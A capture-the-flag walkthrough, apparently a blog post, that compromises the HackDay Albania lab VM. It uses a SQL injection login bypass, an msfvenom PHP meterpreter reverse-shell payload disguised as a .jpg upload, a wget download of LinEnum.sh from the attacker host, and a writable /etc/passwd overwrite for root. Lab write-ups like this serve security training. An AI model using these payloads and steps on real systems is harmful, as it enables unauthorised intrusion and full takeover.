@@ -1,0 +1,101 @@
+
+Hack the Hackday Albania VM (CTF Challenge)
+
+This was used in HackDay Albania’s 2016 CTF. It uses DHCP.
+Note: VMware users may have issues with the network interface doing down by default. You are recommended to use Virtualbox.
+ Download the lab from: https://www.vulnhub.com/entry/hackday-albania,167/
+ Let’s begin. First we run netdiscover(as usual).
+netdiscover
+
+Next we run nmap
+nmap -p- A 192.168.0.103
+
+Nmap result shows that our target is running http on port no.8008. So, we fire up our browser targeting http://192.168.0.103:8008
+
+The message in the box translates to- “if I am, I know where to go :)”
+We try for some hint in the page-source and find a comment at the bottom “Ok ok, but not here :)” Next we run nikto on our target
+nikto -h 192.168.0.103:8008
+
+Upon discovering the existence of robots.txt, we open it up on our browser
+http://192.168.0.103:8008/robots.txt
+
+All but one directory give us the same result.
+
+The directory that proves to be worth visiting is http://192.168.0.103:8008/unisxcudkqjydw/
+
+So, we discover another useful directory. Lets head towards it
+http://192.168.0.103:8008/unisxcudkqjydw/vulnbank/
+
+Clicking on the client/ directory, we are greeted by a login page of very secure bank
+
+Upon trying a single ‘as the username, we get an error page.
+
+After trying multiple credentials, we finally succeed in logging in as the first user
+‘ or ‘a’ = ‘a’ —
+#
+
+On the welcome page, we can find an option to upload a file. Let us create a php payload using msfvenom and try uploading it.
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.106 lport=4444 -f raw
+
+We copy the php code and save it on a leafpad and save it in the name ra.php We try to upload the file but the webpage displays an error- “After we got hackedwe are allowing only image filesto upload such as jpg,jpeg, bmp etc…” Let’s rename our file to ra.jpg and try uploading it again.
+
+Start the msf handler. msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.0.106
+set lport 4444
+exploit
+
+Now we click on view ticket option under ra.jpg on our browser
+
+And we have our meterpreter session. To get a proper shell and reach the tmp folder and find the os release, we fire up the following commands:
+shell
+python3 -c ‘import pty; pty.spawn(“/bin/bash”);’
+cd /tmp
+lsb_release -a
+
+Kernel exploits do not seem to work here since gcc is not installed on our target machine. So, we decide to go the other way. We download a shell called LinEnum.sh from github on another terminal using-
+git clone https://github.com/rebootuser/LinEnum.git
+Thereafter we start apache service on our machine
+service apache2 start
+Thereafter, we copy the LinEnum.sh file to var/www/html folder of our machine and returning to our victim’s shell, we upload the file to his tmp folder
+wget http://192.168.1.106/LinEnum.sh
+Thereafter, change the permission of the uploaded file and run it.
+chmod 777 LinEnum.sh
+./LinEnum.sh
+
+We discover that etc/passwd folder is writable.
+
+And the encryption used by our victim’s machine is SHA512
+
+We open the victim’s password file on the terminal itself
+cat /etc/passwd
+
+We then copy the entire contents of the file and copy it to a leafpad and name it as passwd. To know more about etc/passwd, please visit https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/ or https://www.digitalocean.com/community/tutorials/how-to-use-passwd-and-adduser-to-manage-passwords-on-a-linux-vps
+Thereafter on another terminal, we generate a SHA512 encryption for a password “raj”
+python -c ‘import crypt; print crypt.crypt(“raj”, “$6$saltsalt$”)’
+
+We now copy this hash and replace it with the ‘x’ in the last line of our passwd file which we just saved in leafpad.
+
+Next, we place this file named passwd in the var/www/html folder of our machine and upload it to the victim’s tmp folder
+wget http://192.168.0.106/passwd
+
+Now copy and replace this file with the passwd file present inside the etc folder.
+cp passwd /etc/passwd
+Then we try logging in with the user taviso
+su taviso
+raj
+Next we try the root’s login
+sudo -i
+raj
+Success. Now list the contents
+ls
+here’s our flag. Read its contents using
+cat flag.txt
+
+Urime,
+Tani nis raportin!
+Which translates to:-
+Congratulations,
+Now begins the report!
+Researcher and Author: Jitesh Khanna is a passionate Researcher and Technical Writer at Hacking Articles. He is a hacking enthusiast. Contact here.
